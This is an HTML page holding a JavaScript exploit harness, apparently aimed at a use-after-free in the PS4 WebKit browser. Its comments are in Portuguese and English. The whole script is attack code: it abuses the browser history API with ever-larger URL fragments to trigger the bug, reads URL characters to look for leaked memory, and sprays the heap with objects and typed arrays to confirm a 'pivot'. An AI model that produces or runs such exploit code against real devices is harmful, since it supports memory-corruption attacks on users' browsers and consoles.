<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Step D / Step E</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; padding:10px; margin:6px; }
#log { white-space:pre-wrap; margin-top:10px; }
</style>
</head>

<body>
<h2>PS4 WebKit – UAF Step D & E</h2>

<button onclick="runStepD()">PASSO D – Leak Progressivo</button>
<button onclick="runStepE()">PASSO E – Pivot Controlado</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

// =======================================================
// PHASE 1 – UAF TRIGGER (VALIDADO)
// =======================================================
async function triggerUAF(){
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);
        log(`[ITER ${i}] size=${size}`);
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

// =======================================================
// PASSO D – SAFE PROGRESSIVE LEAK
// =======================================================
async function runStepD(){
    logEl.textContent = "";
    log("=== PASSO D START ===");

    try {
        await triggerUAF();

        const url = document.URL;
        log(`[D] URL.length = ${url.length}`);

        const offsets = [0, 32, 64, 128, 256, 512, 1024, 4096, 8192, 16384, 32768];

        for(let off of offsets){
            if(off >= url.length) break;
            let v = url.charCodeAt(off);
            log(`[D] charCodeAt(${off}) = ${v}`);
            await sleep(2);
        }

        log("[D] history.length = " + history.length);
        log("=== PASSO D END ===");
        log(">>> Observe valores fora do padrão ASCII / mudanças abruptas <<<");

    } catch(e){
        log("[D] Exception: " + e);
    }
}

// =======================================================
// PASSO E – CONTROLLED PIVOT (APÓS D)
// =======================================================
async function runStepE(){
    logEl.textContent = "";
    log("=== PASSO E START ===");
    log(">>> Execute SOMENTE se o Passo D indicou reuse <<<");

    try {
        await triggerUAF();

        log("[E] Allocating pivot candidates");

        let victims = [];
        for(let i=0;i<200;i++){
            victims.push({
                tag: "OBJ"+i,
                pad: "B".repeat(64),
                idx: i
            });
        }

        let buffers = [];
        for(let i=0;i<128;i++){
            buffers.push(new Uint8Array(64));
        }

        await sleep(80);

        log("[E] Reading URL window after pivot allocations");

        const url = document.URL;
        log(`[E] URL.length = ${url.length}`);

        let probe = [0, 32, 64, 96, 128, 256];
        for(let off of probe){
            if(off >= url.length) break;
            let v = url.charCodeAt(off);
            log(`[E] charCodeAt(${off}) = ${v}`);
        }

        log("[E] history.length = " + history.length);
        log("=== PASSO E END ===");
        log(">>> Se valores mudarem vs Passo D, pivot confirmado <<<");

    } catch(e){
        log("[E] Exception: " + e);
    }
}

log("Ready. Execute PASSO D primeiro.");
</script>
</body>
</html>

